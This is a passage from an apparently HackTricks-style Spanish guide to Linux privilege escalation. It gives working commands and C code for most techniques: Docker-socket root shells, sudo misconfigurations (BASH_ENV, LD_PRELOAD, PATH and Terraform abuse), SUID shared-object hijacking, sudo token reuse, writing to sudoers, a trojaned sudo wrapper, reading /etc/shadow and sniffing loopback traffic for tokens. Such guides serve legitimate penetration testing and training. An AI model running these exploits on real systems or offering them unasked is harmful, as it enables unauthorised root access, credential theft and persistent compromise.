Si **identificas cualquier socket escribible** (_aquí nos referimos a Unix Sockets y no a los archivos de configuración `.socket`_), entonces **puedes comunicarte** con ese socket y quizá explotar una vulnerabilidad.

### Enumerar Unix Sockets
```bash
netstat -a -p --unix
```
### Conexión raw
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Ejemplo de explotación:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Ten en cuenta que puede haber algunos **sockets escuchando solicitudes HTTP** (_no me refiero a archivos .socket sino a los archivos que actúan como unix sockets_). Puedes comprobar esto con:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Si el socket **responde con una solicitud HTTP**, entonces puedes **comunicarte** con él y quizá **explotar alguna vulnerabilidad**.

### Socket de Docker escribible

El socket de Docker, a menudo ubicado en `/var/run/docker.sock`, es un archivo crítico que debe asegurarse. Por defecto, tiene permisos de escritura para el usuario `root` y los miembros del grupo `docker`. Poseer acceso de escritura a este socket puede conducir a una escalada de privilegios. Aquí hay un desglose de cómo puede hacerse esto y métodos alternativos si el Docker CLI no está disponible.

#### **Escalada de privilegios con Docker CLI**

Si tienes acceso de escritura al socket de Docker, puedes escalar privilegios usando los siguientes comandos:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Estos comandos te permiten ejecutar un container con acceso con privilegios de root al sistema de archivos del host.

#### **Usando la API de Docker directamente**

En casos donde la CLI de Docker no está disponible, el socket de Docker aún puede manipularse usando la API de Docker y comandos `curl`.

1.  **List Docker Images:** Recupera la lista de imágenes disponibles.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Envía una solicitud para crear un container que monte el directorio raíz del sistema del host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Inicia el container recién creado:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Usa `socat` para establecer una conexión con el container, permitiendo la ejecución de comandos dentro de él.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Después de establecer la conexión `socat`, puedes ejecutar comandos directamente en el container con acceso con privilegios de root al sistema de archivos del host.

### Otros

Ten en cuenta que si tienes permisos de escritura sobre el docker socket porque estás **dentro del grupo `docker`** tienes [**más formas de escalar privilegios**](interesting-groups-linux-pe/index.html#docker-group). Si la [**docker API está escuchando en un puerto** puedes también ser capaz de comprometerla](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Consulta **más formas de escapar de containers o abusar de runtimes de contenedores para escalar privilegios** en:


{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Si descubres que puedes usar el comando **`ctr`**, lee la siguiente página ya que **puedes ser capaz de abusar de él para escalar privilegios**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Si puedes usar el comando **`runc`**, lee la página siguiente ya que **puedes ser capaz de abusar de él para escalar privilegios**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus es un sofisticado sistema de **inter-Process Communication (IPC)** que permite a las aplicaciones interactuar y compartir datos de forma eficiente. Diseñado pensando en el sistema Linux moderno, ofrece un marco robusto para diferentes formas de comunicación entre aplicaciones.

El sistema es versátil, soportando IPC básico que mejora el intercambio de datos entre procesos, similar a sockets de dominio UNIX mejorados. Además, ayuda en la emisión de eventos o señales, fomentando una integración fluida entre componentes del sistema. Por ejemplo, una señal de un daemon de Bluetooth sobre una llamada entrante puede hacer que un reproductor de música se silencie, mejorando la experiencia del usuario. Adicionalmente, D-Bus soporta un sistema de objetos remotos, simplificando solicitudes de servicio e invocaciones de métodos entre aplicaciones, agilizando procesos que tradicionalmente eran complejos.

D-Bus opera con un modelo de **allow/deny**, gestionando permisos de mensajes (llamadas de método, emisión de señales, etc.) basándose en el efecto acumulado de reglas de política que coinciden. Estas políticas especifican interacciones con el bus, y potencialmente permiten una escalada de privilegios mediante la explotación de estos permisos.

Se proporciona un ejemplo de tal política en `/etc/dbus-1/system.d/wpa_supplicant.conf`, detallando permisos para el usuario root de poseer, enviar y recibir mensajes de `fi.w1.wpa_supplicant1`.

Las políticas sin un usuario o grupo especificado se aplican de forma universal, mientras que las políticas de contexto "default" se aplican a todos los no cubiertos por otras políticas específicas.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Aprende cómo enumerate and exploit una comunicación D-Bus aquí:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Red**

Siempre es interesante enumerate la red y averiguar la posición de la máquina.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Outbound filtering quick triage

Si el host puede ejecutar comandos pero los callbacks fallan, separa rápidamente DNS, transport, proxy y route filtering:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Puertos abiertos

Siempre verifica los servicios de red que se están ejecutando en la máquina y con los que no pudiste interactuar antes de acceder a ella:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Clasifica listeners por bind target:

- `0.0.0.0` / `[::]`: expuesto en todas las interfaces locales.
- `127.0.0.1` / `::1`: solo local (buenos candidatos para tunnel/forward).
- IPs internas específicas (p. ej. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): usualmente accesibles solo desde segmentos internos.

### Flujo de triage para servicios solo locales

Cuando comprometes un host, los servicios vinculados a `127.0.0.1` a menudo se vuelven accesibles por primera vez desde tu shell. Un flujo de trabajo local rápido es:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS como escáner de red (modo solo de red)

Además de las comprobaciones PE locales, linPEAS puede ejecutarse como un escáner de red focalizado. Utiliza binarios disponibles en `$PATH` (típicamente `fping`, `ping`, `nc`, `ncat`) y no instala herramientas.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Si pasas `-d`, `-p` o `-i` sin `-t`, linPEAS se comporta como un escáner de red puro (omitiendo el resto de los checks de privilege-escalation).

### Sniffing

Comprueba si puedes sniff traffic. Si puedes, podrías ser capaz de capturar algunas credenciales.
```
timeout 1 tcpdump
```
Comprobaciones prácticas rápidas:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) es especialmente valioso en post-exploitation porque muchos servicios internos exponen allí tokens/cookies/credentials:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Captura ahora, analiza después:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Usuarios

### Enumeración Genérica

Verifica **quién** eres, qué **privilegios** tienes, qué **usuarios** hay en los sistemas, cuáles pueden **login** y cuáles tienen **privilegios root:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Algunas versiones de Linux se vieron afectadas por una vulnerabilidad que permite a usuarios con **UID > INT_MAX** escalar privilegios. Más información: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) y [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Explotarlo** usando: **`systemd-run -t /bin/bash`**

### Groups

Comprueba si eres **miembro de algún grupo** que podría concederte privilegios de root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Comprueba si hay algo interesante en el portapapeles (si es posible)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Política de Contraseñas
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Known passwords

If you **know any password** of the environment **try to login as each user** using the password.

### Su Brute

Si no te importa hacer mucho ruido y los binarios `su` y `timeout` están presentes en el equipo, puedes intentar brute-forcear usuarios usando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) con el parámetro `-a` también intenta brute-forcear usuarios.

## Abusos en $PATH escribible

### $PATH

Si descubres que puedes **escribir dentro de alguna carpeta del $PATH** podrías escalar privilegios creando un backdoor dentro de la carpeta escribible con el nombre de algún comando que vaya a ser ejecutado por un usuario distinto (idealmente root) y que **no se cargue desde una carpeta ubicada antes** de tu carpeta escribible en $PATH.

### SUDO y SUID

Podrías tener permitido ejecutar algún comando usando sudo o podrían tener el bit suid. Compruébalo usando:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Algunos **comandos inesperados permiten leer y/o escribir archivos o incluso ejecutar un comando.** Por ejemplo:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

La configuración de Sudo podría permitir que un usuario ejecute algún comando con los privilegios de otro usuario sin conocer la contraseña.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
En este ejemplo, el usuario `demo` puede ejecutar `vim` como `root`; ahora es trivial obtener un shell añadiendo una ssh key en el directorio root o llamando a `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Esta directiva permite al usuario **set an environment variable** mientras ejecuta algo:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Este ejemplo, **basado en la máquina HTB Admirer**, fue **vulnerable** a **PYTHONPATH hijacking** para cargar una biblioteca python arbitraria al ejecutar el script como root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preservado mediante sudo env_keep → shell de root

Si sudoers preserva `BASH_ENV` (p. ej., `Defaults env_keep+="ENV BASH_ENV"`), puedes aprovechar el comportamiento de arranque no interactivo de Bash para ejecutar código arbitrario como root al invocar un comando permitido.

- Why it works: Para shells no interactivos, Bash evalúa `$BASH_ENV` y se carga ese archivo (sourced) antes de ejecutar el script objetivo. Muchas reglas de sudo permiten ejecutar un script o un wrapper de shell. Si `BASH_ENV` es preservado por sudo, tu archivo se sourcea con privilegios de root.

- Requisitos:
- Una regla de sudo que puedas ejecutar (cualquier target que invoque `/bin/bash` de manera no interactiva, o cualquier bash script).
- `BASH_ENV` presente en `env_keep` (compruébalo con `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Eliminar `BASH_ENV` (y `ENV`) de `env_keep`, preferir `env_reset`.
- Evitar wrappers de shell para comandos permitidos por sudo; usar binarios mínimos.
- Considerar logging I/O de sudo y alertas cuando se usan variables de entorno preservadas.

### Terraform via sudo with preserved HOME (!env_reset)

Si sudo deja el entorno intacto (`!env_reset`) mientras permite `terraform apply`, `$HOME` permanece como el usuario que llamó. Terraform por lo tanto carga **$HOME/.terraformrc** como root y respeta `provider_installation.dev_overrides`.

- Apuntar el proveedor requerido a un directorio escribible y colocar un plugin malicioso nombrado como el proveedor (p. ej., `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform fallará en el Go plugin handshake pero ejecutará el payload como root antes de morir, dejando un shell SUID.

### TF_VAR overrides + symlink validation bypass

Las variables de Terraform se pueden proporcionar mediante variables de entorno `TF_VAR_<name>`, las cuales sobreviven cuando sudo preserva el entorno. Validaciones débiles como `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` pueden ser bypassed con symlinks:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform resuelve el symlink y copia el archivo real `/root/root.txt` en un destino legible por el atacante. El mismo enfoque puede usarse para **escribir** en rutas privilegiadas pre-creando enlaces simbólicos de destino (p. ej., apuntando la ruta de destino del provider dentro de `/etc/cron.d/`).

### requiretty / !requiretty

En algunas distribuciones antiguas, sudo puede configurarse con `requiretty`, que obliga a sudo a ejecutarse solo desde un TTY interactivo. Si `!requiretty` está establecido (o la opción está ausente), sudo puede ejecutarse desde contextos no interactivos como reverse shells, cron jobs o scripts.
```bash
Defaults !requiretty
```
This is not a direct vulnerability by itself, but it expands the situations where sudo rules can be abused without needing a full PTY.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Esto no es una vulnerabilidad directa por sí misma, pero amplía las situaciones en las que las reglas de sudo pueden ser abusadas sin necesidad de un PTY completo.

Si `sudo -l` muestra `env_keep+=PATH` o un `secure_path` que contenga entradas escribibles por un atacante (p. ej., `/home/<user>/bin`), cualquier comando relativo dentro del objetivo permitido por sudo puede ser enmascarado.

- Requisitos: una regla de sudo (a menudo `NOPASSWD`) que ejecute un script/binario que llame a comandos sin rutas absolutas (`free`, `df`, `ps`, etc.) y una entrada PATH escribible que se busque primero.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo: rutas para eludir la ejecución
**Saltar** para leer otros archivos o usar **symlinks**. Por ejemplo, en el archivo sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Si se usa un **wildcard** (\*), es aún más fácil:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contramedidas**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary sin especificar la ruta del comando

Si se concede el **sudo permission** a un único comando **sin especificar la ruta**: _hacker10 ALL= (root) less_ puedes explotarlo cambiando la variable PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Esta técnica también puede usarse si un binario **suid** **ejecuta otro comando sin especificar la ruta al mismo (siempre comprueba con** _**strings**_ **el contenido de un binario SUID extraño)**.

[Payload examples to execute.](payloads-to-execute.md)

### Binario SUID con ruta del comando

Si el binario **suid** **ejecuta otro comando especificando la ruta**, entonces puedes intentar **exportar una función** con el nombre del comando que el archivo suid está llamando.

Por ejemplo, si un binario suid llama a _**/usr/sbin/service apache2 start**_ tienes que intentar crear la función y exportarla:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Entonces, al invocar el binario suid, se ejecutará esta función

### Script escribible ejecutado por un SUID wrapper

Una misconfiguración común en aplicaciones personalizadas es un wrapper binario SUID propiedad de root que ejecuta un script, mientras que el propio script es escribible por usuarios de bajo privilegio.

Patrón típico:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Si `/usr/local/bin/backup.sh` es escribible, puedes anexar comandos payload y luego ejecutar el SUID wrapper:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Comprobaciones rápidas:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
This attack path is especially common in "maintenance"/"backup" wrappers shipped in `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

La variable de entorno **LD_PRELOAD** se usa para especificar una o más bibliotecas compartidas (.so files) que el loader cargará antes que las demás, incluyendo la biblioteca estándar de C (`libc.so`). Este proceso se conoce como precarga de una biblioteca.

Sin embargo, para mantener la seguridad del sistema y evitar que esta funcionalidad sea explotada, especialmente con ejecutables con **suid/sgid**, el sistema aplica ciertas condiciones:

- El loader ignora **LD_PRELOAD** para ejecutables donde el UID real (_ruid_) no coincide con el UID efectivo (_euid_).
- Para ejecutables con suid/sgid, solo se precargan bibliotecas en rutas estándar que también sean suid/sgid.

La escalada de privilegios puede ocurrir si tienes la capacidad de ejecutar comandos con `sudo` y la salida de `sudo -l` incluye la sentencia **env_keep+=LD_PRELOAD**. Esta configuración permite que la variable de entorno **LD_PRELOAD** persista y sea reconocida incluso cuando los comandos se ejecutan con `sudo`, lo que puede derivar en la ejecución de código arbitrario con privilegios elevados.
```
Defaults        env_keep += LD_PRELOAD
```
Guardar como **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Entonces **compílalo** usando:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Finalmente, **escalate privileges** ejecutando
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Un privesc similar puede explotarse si el atacante controla la variable de entorno **LD_LIBRARY_PATH**, ya que controla la ruta donde se buscarán las bibliotecas.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Cuando te encuentras con un binario con permisos **SUID** que parece inusual, es buena práctica verificar si está cargando correctamente archivos **.so**. Esto se puede comprobar ejecutando el siguiente comando:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Por ejemplo, encontrarse con un error como _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugiere la posibilidad de explotación.

Para explotarlo, se procedería creando un archivo en C, por ejemplo _"/path/to/.config/libcalc.c"_, que contenga el siguiente código:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Este código, una vez compilado y ejecutado, tiene como objetivo elevar privilegios manipulando permisos de archivos y ejecutando una shell con privilegios elevados.

Compila el archivo C anterior en un objeto compartido (.so) con:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Finalmente, ejecutar el SUID binary afectado debería activar el exploit, permitiendo un posible compromiso del sistema.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Ahora que hemos encontrado un binario SUID que carga una biblioteca desde una carpeta en la que podemos escribir, creemos la biblioteca en esa carpeta con el nombre necesario:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Si obtienes un error como
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
eso significa que la librería que has generado necesita tener una función llamada `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) es una lista seleccionada de binarios Unix que pueden ser explotados por un atacante para eludir restricciones de seguridad locales. [**GTFOArgs**](https://gtfoargs.github.io/) es lo mismo pero para casos en los que **solo puedes inyectar argumentos** en un comando.

El proyecto recopila funciones legítimas de binarios Unix que pueden ser abusadas para salir de shells restringidas, escalar o mantener privilegios elevados, transferir archivos, spawn de bind y reverse shells, y facilitar otras tareas de post-explotación.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Si puedes ejecutar `sudo -l`, puedes usar la herramienta [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) para comprobar si encuentra cómo explotar alguna regla de sudo.

### Reutilización de tokens de sudo

En casos donde tienes **sudo access** pero no la contraseña, puedes escalar privilegios esperando a que se ejecute un comando sudo y luego secuestrando el token de sesión.

Requisitos para escalar privilegios:

- Ya tienes una shell como el usuario "_sampleuser_"
- "_sampleuser_" ha **usado `sudo`** para ejecutar algo en los **últimos 15 minutos** (por defecto esa es la duración del token de sudo que nos permite usar `sudo` sin introducir ninguna contraseña)
- `cat /proc/sys/kernel/yama/ptrace_scope` es 0
- `gdb` es accesible (puedes subirlo)

(Puedes habilitar temporalmente `ptrace_scope` con `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` o de forma permanente modificando `/etc/sysctl.d/10-ptrace.conf` y estableciendo `kernel.yama.ptrace_scope = 0`)

Si se cumplen todos estos requisitos, **puedes escalar privilegios usando:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- El **primer exploit** (`exploit.sh`) creará el binario `activate_sudo_token` en _/tmp_. Puedes usarlo para **activar el sudo token en tu sesión** (no obtendrás automáticamente una shell root, ejecuta `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- El **segundo exploit** (`exploit_v2.sh`) creará un sh shell en _/tmp_ **perteneciente a root con setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- El **tercer exploit** (`exploit_v3.sh`) **creará un sudoers file** que **hace que los sudo tokens sean eternos y permite a todos los usuarios usar sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Si tienes **permisos de escritura** en la carpeta o en cualquiera de los archivos creados dentro de la carpeta, puedes usar el binario [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) para **crear un sudo token para un usuario y PID**.\
Por ejemplo, si puedes sobrescribir el archivo _/var/run/sudo/ts/sampleuser_ y tienes una shell como ese usuario con PID 1234, puedes **obtener privilegios sudo** sin necesitar conocer la contraseña haciendo:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

El archivo `/etc/sudoers` y los archivos dentro de `/etc/sudoers.d` configuran quién puede usar `sudo` y cómo. Estos archivos **por defecto solo pueden ser leídos por el usuario root y el grupo root**.\
**Si** puedes **leer** este archivo podrías **obtener información interesante**, y si puedes **escribir** cualquier archivo podrás **elevar privilegios**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Si puedes escribir, puedes abusar de este permiso.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Otra forma de abusar de estos permisos:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Existen algunas alternativas al binario `sudo`, como `doas` para OpenBSD; recuerda comprobar su configuración en `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Si sabes que un **user suele conectarse a una machine y usa `sudo`** para escalar privilegios y obtuviste una shell dentro de ese user context, puedes **crear un nuevo sudo executable** que ejecutará tu código como root y luego el comando del user. Luego, **modifica el $PATH** del user context (por ejemplo añadiendo la nueva ruta en .bash_profile) para que cuando el user ejecute sudo, se ejecute tu sudo executable.

Ten en cuenta que si el user usa una shell diferente (no bash) necesitarás modificar otros archivos para añadir la nueva ruta. Por ejemplo [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifica `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Puedes encontrar otro ejemplo en [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

O ejecutando algo como:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Librería compartida

### ld.so

